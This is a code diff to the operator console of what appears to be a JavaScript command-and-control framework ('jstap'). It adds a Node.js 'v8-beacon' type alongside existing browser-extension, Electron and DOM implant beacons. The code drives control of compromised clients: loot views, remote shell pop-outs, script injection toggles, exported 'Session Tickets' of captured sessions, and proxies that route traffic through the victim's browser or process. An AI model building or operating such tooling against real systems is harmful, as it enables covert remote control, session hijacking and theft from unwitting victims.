@@ -2,6 +2,7 @@ let selectedClientId = "";
 let lastSelectedAppId = "";
 let lastSelectedBrowserId = "";
 let lastSelectedElectronId = "";
+let lastSelectedNodeId = "";
 let refreshingDetails = false;
 let activeBexTab = 'loot'; // 'loot' or 'tools'
 let tokenUrl         = "";
@@ -31,6 +32,7 @@ let clientIncrementAmount = 20;
 let _prevAppCount = -1;
 let _prevBrowserCount = -1;
 let _prevElectronCount = -1;
+let _prevNodeCount = -1;
 let _soundEnabled = localStorage.getItem('jstap_sound_notifications') !== 'false';
 
 function playChime(type) {
@@ -540,7 +542,7 @@ async function showAllNotesModal()
 	for (let i = 0; i < jsonResponse.length; i++)
 	{
 		var entry = jsonResponse[i];
-		var typeLabel = entry.clientType === 'bex-beacon' ? 'Browser (BEX Beacon)' : entry.clientType === 'atom-beacon' ? 'Electron (Atom Beacon)' : 'App (DOM Beacon)';
+		var typeLabel = entry.clientType === 'bex-beacon' ? 'Browser (BEX Beacon)' : entry.clientType === 'atom-beacon' ? 'Electron (Atom Beacon)' : entry.clientType === 'v8-beacon' ? 'Node (V8 Beacon)' : 'App (DOM Beacon)';
 
 		noteArea.innerHTML += "===========================================\n";
 
@@ -2984,7 +2986,7 @@ function toggleBexInjection(beaconID, domain, isActive) {
 
 // ---- Ticket Functions ----
 
-async function generateCloneTicket(domainID) {
+async function generateSessionTicket(domainID) {
     try {
         var resp = await fetch('/api/jstap/ticket/' + domainID);
         if (!resp.ok) {
@@ -2994,7 +2996,7 @@ async function generateCloneTicket(domainID) {
         var ticket = await resp.json();
         var text = btoa(JSON.stringify(ticket));
         navigator.clipboard.writeText(text).then(function() {
-            showToast('Clone Ticket copied to clipboard');
+            showToast('Session Ticket copied to clipboard');
         }).catch(function() {
             showToast('Clipboard unavailable', 'danger');
         });
@@ -3356,7 +3358,8 @@ function sidecarPopOutShell(beaconId) {
     if (!popWin) { showToast('Pop-up blocked. Please allow pop-ups for this site.', 'warning'); return; }
 
     var isAtomShell = (beaconId == lastSelectedElectronId);
-    var shellLabel = isAtomShell ? 'Atom Shell' : 'Sidecar Shell';
+    var isV8Shell = (beaconId == lastSelectedNodeId);
+    var shellLabel = isAtomShell ? 'Atom Shell' : isV8Shell ? 'V8 Shell' : 'Sidecar Shell';
     var titleText = shellLabel + ' - ' + (_sidecarShellNickname || beaconId);
     var transferState = {
         beaconId: beaconId,
@@ -3602,6 +3605,8 @@ async function getClientDetails(id, autoRefresh)
                 lastSelectedBrowserId = client.id;
             } else if (client.clientType === 'atom-beacon') {
                 lastSelectedElectronId = client.id;
+            } else if (client.clientType === 'v8-beacon') {
+                lastSelectedNodeId = client.id;
             } else {
                 lastSelectedAppId = client.id;
             }
@@ -3620,6 +3625,8 @@ async function getClientDetails(id, autoRefresh)
                 setupBeaconHeaderToggle('Browser');
             } else if (client.clientType === 'atom-beacon') {
                 setupBeaconHeaderToggle('Electron');
+            } else if (client.clientType === 'v8-beacon') {
+                setupBeaconHeaderToggle('Node');
             } else {
                 setupBeaconHeaderToggle('App');
             }
@@ -3651,14 +3658,14 @@ async function getClientDetails(id, autoRefresh)
             _sidecarShellIsWindows = false;
         }
 
-        if (client && (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon')) {
+        if (client && (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon')) {
             // Sidecar panel for beacon-type clients (if available)
             if (client.sidecarSupported) {
                 let sidecarPanel = document.getElementById('sidecar-panel');
-                var isAtomBeacon = client.clientType === 'atom-beacon';
-                var panelTitle = isAtomBeacon ? 'OS Tools' : 'Sidecar';
+                var isBuiltinBeacon = client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon';
+                var panelTitle = isBuiltinBeacon ? 'OS Tools' : 'Sidecar';
                 var sidecarBadgeHtml;
-                if (isAtomBeacon) {
+                if (isBuiltinBeacon) {
                     sidecarBadgeHtml = '';
                 } else {
                     sidecarBadgeHtml = client.sidecarConnected
@@ -3746,7 +3753,7 @@ async function getClientDetails(id, autoRefresh)
                 } else {
                     // Panel exists — update the badge on refresh
                     var existingBadge = sidecarPanel.querySelector('#sidecar-badge');
-                    if (existingBadge && !isAtomBeacon) {
+                    if (existingBadge && !isBuiltinBeacon) {
                         // Only update connection state for bex-beacon (sidecar binary)
                         if (client.sidecarConnected) {
                             existingBadge.className = 'badge bg-success';
@@ -3761,27 +3768,27 @@ async function getClientDetails(id, autoRefresh)
 
             // Proxy panel -> tools stack (rendered first, above sidecar; browser-extension only)
             var proxyState = { isActive: false };
-            if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon') {
+            if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon') {
                 try { proxyState = await renderProxyPanel(toolsStack, id, client) || proxyState; } catch(e) { console.error('Proxy panel error:', e); }
             }
 
-            // Beacon Callback panel for BEX and Atom beacons
-            if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon') {
+            // Beacon Callback panel for BEX, Atom, and V8 beacons
+            if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon') {
                 try { renderBeaconCallbackPanel(toolsStack, id, client.clientType); } catch(e) { console.error('Beacon Callback panel error:', e); }
             }
 
-            // Screenshots panel for atom-beacon clients
+            // Screenshots panel for atom-beacon clients only (no GUI on v8-beacon)
             if (client.clientType === 'atom-beacon') {
                 try { renderScreenshotPanel(toolsStack, id); } catch(e) { console.error('Screenshot panel error:', e); }
             }
 
-            // Plugin panel for atom-beacon clients
+            // Plugin panel for atom-beacon clients only (not v8-beacon)
             if (client.clientType === 'atom-beacon') {
                 try { await renderPluginPanel(toolsStack, id, client); } catch(e) { console.error('Plugin panel error:', e); }
             }
 
-            // Atom-beacon uses app-style event timeline, not domain view
-            if (client.clientType === 'atom-beacon') {
+            // Atom-beacon and v8-beacon use app-style event timeline, not domain view
+            if (client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon') {
                 // Close the beacon block — fall through to app-style event view below
             } else {
 
@@ -3881,12 +3888,12 @@ async function getClientDetails(id, autoRefresh)
                     injectBtn.onclick = function() { toggleBexInjection(id, d.domain, !!activeMap[d.domain]); };
                     controlsArea.appendChild(injectBtn);
 
-                    const cloneTicketBtn = document.createElement('button');
-                    cloneTicketBtn.style.minWidth = "120px";
-                    cloneTicketBtn.className = 'btn btn-primary btn-sm';
-                    cloneTicketBtn.textContent = 'Clone Ticket';
-                    cloneTicketBtn.onclick = function() { generateCloneTicket(d.id); };
-                    controlsArea.appendChild(cloneTicketBtn);
+                    const sessionTicketBtn = document.createElement('button');
+                    sessionTicketBtn.style.minWidth = "120px";
+                    sessionTicketBtn.className = 'btn btn-primary btn-sm';
+                    sessionTicketBtn.textContent = 'Session Ticket';
+                    sessionTicketBtn.onclick = function() { generateSessionTicket(d.id); };
+                    controlsArea.appendChild(sessionTicketBtn);
 
                     const captureBtn = document.createElement('button');
                     captureBtn.style.minWidth = "120px";
@@ -3958,7 +3965,7 @@ async function getClientDetails(id, autoRefresh)
             newEvents = jsonResponse.filter(e => e.id > lastMaxEventId);
             if (newEvents.length === 0) {
                 // Nothing new — skip entirely, preserve scroll
-                if (client && (client.clientType === 'atom-beacon' || client.clientType === 'js-implant')) {
+                if (client && (client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon' || client.clientType === 'js-implant')) {
                     switchBexTab(activeBexTab);
                 }
                 return;
@@ -4246,7 +4253,7 @@ async function getClientDetails(id, autoRefresh)
         }
 
         // Enforce tab visibility for clients with tools
-        if (client && (client.clientType === 'atom-beacon' || client.clientType === 'js-implant')) {
+        if (client && (client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon' || client.clientType === 'js-implant')) {
             switchBexTab(activeBexTab);
         }
     } finally {
@@ -4264,7 +4271,7 @@ async function getClientDetails(id, autoRefresh)
 
 async function renderProxyPanel(cardStack, beaconId, client) {
     let panel = document.getElementById('proxy-panel');
-    var isAtom = client && client.clientType === 'atom-beacon';
+    var isAtom = client && (client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon');
 
     // Fetch proxy status for this specific beacon
     var statusResp = await fetch('/api/proxy/status?beaconID=' + encodeURIComponent(beaconId));
@@ -4291,9 +4298,14 @@ async function renderProxyPanel(cardStack, beaconId, client) {
         }
     }
 
-    var panelTitle = isAtom ? 'App Proxy' : 'Browser Proxy';
+    var panelTitle = client && client.clientType === 'v8-beacon' ? 'V8 Proxy'
+        : client && client.clientType === 'atom-beacon' ? 'Atom Proxy'
+        : client && client.clientType === 'bex-beacon' ? 'BEX Proxy'
+        : 'DOM Proxy';
     var panelDesc = isAtom
-        ? "Route your browser traffic through this Electron app. Requests execute with the app's full session cookies and network context."
+        ? client && client.clientType === 'v8-beacon'
+            ? "Route your browser traffic through this Node.js process. Requests execute with the process's network context."
+            : "Route your browser traffic through this Electron app. Requests execute with the app's full session cookies and network context."
         : "Route your browser traffic through this beacon. Requests are fetched from the victim's browser/IP via WebSocket.";
 
     panel.innerHTML = `
@@ -4354,7 +4366,7 @@ function renderBeaconCallbackPanel(cardStack, beaconId, clientType) {
     var panel = document.getElementById('beacon-callback-panel');
     if (panel) return; // Already rendered
 
-    var isAtom = clientType === 'atom-beacon';
+    var isAtom = clientType === 'atom-beacon' || clientType === 'v8-beacon';
     var isImplant = clientType === 'js-implant';
     var defaultBase = isAtom ? 2 : (isImplant ? 2 : 5);
     var defaultJitter = isAtom ? 10 : (isImplant ? 0 : 30);
@@ -4948,6 +4960,7 @@ function removeBeaconHeaderToggle() {
 function getActiveClientType() {
     if (document.getElementById('toggleBrowsers').checked) return 'browsers';
     if (document.getElementById('toggleElectrons').checked) return 'electrons';
+    if (document.getElementById('toggleNodes').checked) return 'nodes';
     return 'apps';
 }
 
@@ -5113,15 +5126,17 @@ async function updateClients()
     const appCount = clientsJson.filter(c => c.clientType === 'js-implant' || (!c.clientType)).length;
     const browserCount = clientsJson.filter(c => c.clientType === 'bex-beacon').length;
     const electronCount = clientsJson.filter(c => c.clientType === 'atom-beacon').length;
+    const nodeCount = clientsJson.filter(c => c.clientType === 'v8-beacon').length;
     const statsEl = document.getElementById('client-stats');
     if (statsEl) {
-        statsEl.innerHTML = `Apps: <b>${appCount}</b> &nbsp;|&nbsp; Browsers: <b>${browserCount}</b> &nbsp;|&nbsp; Electrons: <b>${electronCount}</b>`;
+        statsEl.innerHTML = `Apps: <b>${appCount}</b> &nbsp;|&nbsp; Browsers: <b>${browserCount}</b> &nbsp;|&nbsp; Electrons: <b>${electronCount}</b> &nbsp;|&nbsp; Nodes: <b>${nodeCount}</b>`;
 
         // Detect new arrivals (skip first load when _prev is -1)
         var newApp = _prevAppCount >= 0 && appCount > _prevAppCount;
         var newBrowser = _prevBrowserCount >= 0 && browserCount > _prevBrowserCount;
         var newElectron = _prevElectronCount >= 0 && electronCount > _prevElectronCount;
-        if (newApp || newBrowser || newElectron) {
+        var newNode = _prevNodeCount >= 0 && nodeCount > _prevNodeCount;
+        if (newApp || newBrowser || newElectron || newNode) {
             // Animate stats
             statsEl.classList.remove('stats-pulse', 'stats-flash-app', 'stats-flash-browser', 'stats-flash-electron');
             void statsEl.offsetWidth; // force reflow to restart animation
@@ -5133,11 +5148,12 @@ async function updateClients()
 
             // Play chime
             if (newApp) playChime('app');
-            else playChime('browser'); // reuse browser chime for electrons
+            else playChime('browser'); // reuse browser chime for electrons and nodes
         }
         _prevAppCount = appCount;
         _prevBrowserCount = browserCount;
         _prevElectronCount = electronCount;
+        _prevNodeCount = nodeCount;
     }
 
 	// Start setting up the client cards
@@ -5180,6 +5196,11 @@ async function updateClients()
             selectedClientId = lastSelectedElectronId;
             if (selectedClientId) getClientDetails(selectedClientId);
         }
+    } else if (activeType === 'nodes') {
+        if (selectedClientId != lastSelectedNodeId) {
+            selectedClientId = lastSelectedNodeId;
+            if (selectedClientId) getClientDetails(selectedClientId);
+        }
     } else {
         if (selectedClientId != lastSelectedAppId) {
             selectedClientId = lastSelectedAppId;
@@ -5190,7 +5211,7 @@ async function updateClients()
     // Auto-refresh detail view if a beacon is selected (to update injection status)
     if (selectedClientId && !refreshingDetails) {
         const selectedClient = clientsJson.find(c => c.id == selectedClientId);
-        if (selectedClient && (selectedClient.clientType === 'bex-beacon' || selectedClient.clientType === 'atom-beacon')) {
+        if (selectedClient && (selectedClient.clientType === 'bex-beacon' || selectedClient.clientType === 'atom-beacon' || selectedClient.clientType === 'v8-beacon')) {
             getClientDetails(selectedClientId, true);
         }
     }
@@ -5205,6 +5226,8 @@ async function updateClients()
         setupBeaconHeaderToggle('Browser');
     } else if (activeType === 'electrons') {
         setupBeaconHeaderToggle('Electron');
+    } else if (activeType === 'nodes') {
+        setupBeaconHeaderToggle('Node');
     } else {
         // If an App client is selected, keep the Loot/Tools toggle; otherwise plain label
         if (selectedClientId) {
@@ -5233,7 +5256,8 @@ async function updateClients()
 		const activeType2 = getActiveClientType();
 		if (activeType2 === 'browsers' && client.clientType !== 'bex-beacon') continue;
 		if (activeType2 === 'electrons' && client.clientType !== 'atom-beacon') continue;
-		if (activeType2 === 'apps' && (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon')) continue;
+		if (activeType2 === 'nodes' && client.clientType !== 'v8-beacon') continue;
+		if (activeType2 === 'apps' && (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon')) continue;
 
 		if (document.getElementById('onlyStarredClients').checked == true)
 		{
@@ -5338,7 +5362,7 @@ async function updateClients()
   cardText.innerHTML += "<br>Platform:<b>&nbsp;&nbsp;&nbsp;" + escapeHTML(client.platform) + "</b><br>";
   cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + escapeHTML(client.browser) + "</b>";
 
-  if (client.clientType !== 'bex-beacon' && client.clientType !== 'atom-beacon') {
+  if (client.clientType !== 'bex-beacon' && client.clientType !== 'atom-beacon' && client.clientType !== 'v8-beacon') {
     if (client.hasJobs)
     {
       cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
@@ -5355,7 +5379,7 @@ async function updateClients()
   cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
   cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";
 
-  if (client.clientType !== 'bex-beacon' && client.clientType !== 'atom-beacon' && client.domain) {
+  if (client.clientType !== 'bex-beacon' && client.clientType !== 'atom-beacon' && client.clientType !== 'v8-beacon' && client.domain) {
       cardSubtitle.innerHTML += "<br>Domain: <b>" + escapeHTML(client.domain) + "</b>";
   }
 
@@ -5364,7 +5388,7 @@ async function updateClients()
   cardBody.appendChild(cardText);
 
   // Add child client summary if it's a beacon
-  if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon') {
+  if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon') {
       const myChildren = clientsJson.filter(c => c.parentUUID === client.uuid);
       if (myChildren.length > 0) {
           var childrenDiv = document.createElement('div');
@@ -5657,7 +5681,7 @@ function renderLootSearchResults(data)
 		var clientLabel = '';
 		if (r.clientTag) clientLabel = r.clientTag + '/';
 		clientLabel += r.clientNickname;
-		var clientTypeIcon = r.clientType === 'bex-beacon' ? ' [bex]' : r.clientType === 'atom-beacon' ? ' [atom]' : '';
+		var clientTypeIcon = r.clientType === 'bex-beacon' ? ' [bex]' : r.clientType === 'atom-beacon' ? ' [atom]' : r.clientType === 'v8-beacon' ? ' [v8]' : '';
 		var line2 = '<div><small>Client: <b>' + escapeHtmlSearch(clientLabel) + '</b>';
 		if (r.clientIP) line2 += ' (' + escapeHtmlSearch(r.clientIP) + ')';
 		line2 += escapeHtmlSearch(clientTypeIcon) + '</small></div>';
